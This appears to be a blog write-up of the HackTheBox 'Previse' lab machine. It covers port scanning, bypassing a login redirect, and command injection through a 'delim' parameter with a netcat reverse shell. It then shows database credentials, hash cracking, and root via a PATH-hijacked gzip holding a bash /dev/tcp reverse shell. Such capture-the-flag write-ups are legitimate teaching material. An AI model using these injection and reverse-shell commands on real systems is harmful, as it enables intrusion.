+++
author = "Khaled Ngm"
title = "Previse write-up (HackTheBox)"
date = "2022-07-04"
description = ""
+++
# Previse write-up HackTheBox
![previse](/images/1.png)
### 1. Port Scan Enumuration
### 2. Exploitation
### 3. Privilege Escalation
* ### USER
* ### ROOT

## Port Scan (Nmap)
* First We will scan target with nmap ``nmap -sV -sC 10.10.11.104``
* I found two open ports ``ssh`` and ``http``
```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-02 03:00 EDT
Stats: 0:02:04 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 39.79% done; ETC: 03:05 (0:03:08 remaining)
Stats: 0:06:16 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 03:06 (0:00:07 remaining)
Nmap scan report for previse.htb (10.10.11.104)
Host is up (0.45s latency).
Not shown: 997 closed ports
PORT     STATE    SERVICE          VERSION
22/tcp   open     ssh              OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|_  256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
80/tcp   open     http             Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: Previse Login
|_Requested resource was login.php
3269/tcp filtered globalcatLDAPssl
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 515.82 seconds

```
## Exploitation
* I found login Web page at http server.
* let's try to fuzz directories with DirSearch .
``python3 dirsearch.py -u http://10.10.11.104/`` and I have found an interesting directory called ``nav.php``

     ![](/images/2.png)
*  I tried to create account or visit any another links but pages have been redirected to ``login.php`` with ``302 Found``
* So I tried to edit response with ``200 ok`` and send it back to the server .

![](/images/3.png)

* And I got a registration form , Then I created a new account.
* When I logged in I found visited ``files`` menu and found ``SITEBACKUP.ZIP`` file .
*  When I extracted The file I found interesting files such as ``config.php`` that contian db credentials and more interesting php file called ``log.php`` , let's check source code.
* I found ``exec`` function that take delim via post request run python script without any validation .
* I went to log file page MANAGEMENT MENU >> LOG DATA and opened burp broxy to see request.
* So I listened on the server with ``nc -nlvp 9999`` and tried to inject ``delim`` with reverse shell ``delim=comma;nc+-e+/bin/sh+[ip]+[port]`` and finally I got a shell .
* lets use ``python -c "import pty;pty.spawn('/bin/sh')"`` to get interactive shell .
## Privilege escalation (User)
* Now we are ``www-data`` we will try to escalat our privilages .
* Let's connect to database with ``username`` and ``password`` located in ``config.php`` file , ``mysql -u root -D previse -p`` and then password ``mySQL_p@ssw0rd!:)``.
* Then I found a Table Called ``account`` , let's show table content with ``select * from accounts;``
* And I found a user called ``m4lwhere`` that already exist on OS , and I tried to Identify hash type with hashID .
*When I got the mode of hash I used ``hashcat`` to decrypt it with ``hashcat -a 3 -m 500 hash.txt /wordlist_path`` that retrieve ``ilovecody112235!`` password .
* Let's connect with ``ssh`` to get user flag ``ssh m4lwhere@10.10.11.104``
## Privilege escalation (Root)
* First we will apply ``sudo -l`` command to see what commands this user can run with high privileges .
* user can run ``/opt/scripts/access_backup.sh`` as a root .
* When I checked content I found ``gzip`` command run without full path.
* let's create file called ``gzip`` with bash reverse shell content ``bash -i >& /dev/tcp/ip/port 0>&1`` at ``/tmp`` directory and add this file to PATH ``export PATH="/tmp:$PATH"`` and give it a permission ``chmod +x /tmp/gzip``.
* Now we can listen on port and run command ``sudo /opt/scripts/access_backup.sh`` .
* Finally we Got a root shell . :).
# Thanks
